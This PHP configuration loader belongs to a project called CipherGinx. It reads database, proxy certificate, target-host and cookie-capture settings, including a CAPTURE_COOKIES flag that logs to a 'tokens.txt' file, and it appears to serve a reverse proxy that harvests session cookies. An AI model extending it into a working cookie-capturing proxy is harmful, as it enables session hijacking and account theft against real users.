<?php

namespace CipherGinx;

use Dotenv\Dotenv;

/**
 * Configuration Loader
 * Loads configuration from .env and config files
 */
class ConfigLoader
{
    private array $config = [];

    /**
     * Load configuration from .env file and environment
     */
    public function load(string $env_file = '.env'): array
    {
        // Load .env file if it exists
        if (file_exists($env_file)) {
            $dotenv = Dotenv::createImmutable(dirname($env_file));
            $dotenv->load();
        }

        // Load database configuration
        $this->config['db_host'] = $_ENV['DB_HOST'] ?? 'localhost';
        $this->config['db_port'] = $_ENV['DB_PORT'] ?? 3306;
        $this->config['db_name'] = $_ENV['DB_NAME'] ?? 'cipherginx';
        $this->config['db_user'] = $_ENV['DB_USER'] ?? 'root';
        $this->config['db_password'] = $_ENV['DB_PASSWORD'] ?? '';

        // Load proxy configuration
        $this->config['proxy_host'] = $_ENV['PROXY_HOST'] ?? 'localhost';
        $this->config['proxy_port'] = $_ENV['PROXY_PORT'] ?? 443;
        $this->config['proxy_ssl'] = $_ENV['PROXY_SSL'] === 'true';
        $this->config['proxy_cert_path'] = $_ENV['PROXY_CERT_PATH'] ?? './certs/server.pem';
        $this->config['proxy_key_path'] = $_ENV['PROXY_KEY_PATH'] ?? './certs/server.key';

        // Load logging configuration
        $this->config['log_level'] = $_ENV['LOG_LEVEL'] ?? 'info';
        $this->config['log_file'] = $_ENV['LOG_FILE'] ?? './logs/cipherginx.log';

        // Load target configuration
        $this->config['target_host'] = $_ENV['TARGET_HOST'] ?? 'example.com';
        $this->config['target_ssl'] = $_ENV['TARGET_SSL'] === 'true';

        // Load capture configuration
        $this->config['capture_cookies'] = $_ENV['CAPTURE_COOKIES'] === 'true';
        $this->config['cookie_log_file'] = $_ENV['COOKIE_LOG_FILE'] ?? './logs/tokens.txt';

        // Debug mode
        $this->config['debug'] = $_ENV['DEBUG'] === 'true';

        return $this->config;
    }

    /**
     * Load target-specific config from PHP file
     */
    public function loadTargetConfig(string $config_file): array
    {
        if (!file_exists($config_file)) {
            throw new \Exception("Config file not found: $config_file");
        }

        $target_config = include $config_file;

        if (!is_array($target_config)) {
            throw new \Exception("Config file must return an array: $config_file");
        }

        // Merge with base configuration
        return array_merge($this->config, $target_config);
    }

    /**
     * Get configuration value by key
     */
    public function get(string $key, $default = null)
    {
        return $this->config[$key] ?? $default;
    }

    /**
     * Set configuration value
     */
    public function set(string $key, $value): void
    {
        $this->config[$key] = $value;
    }
}
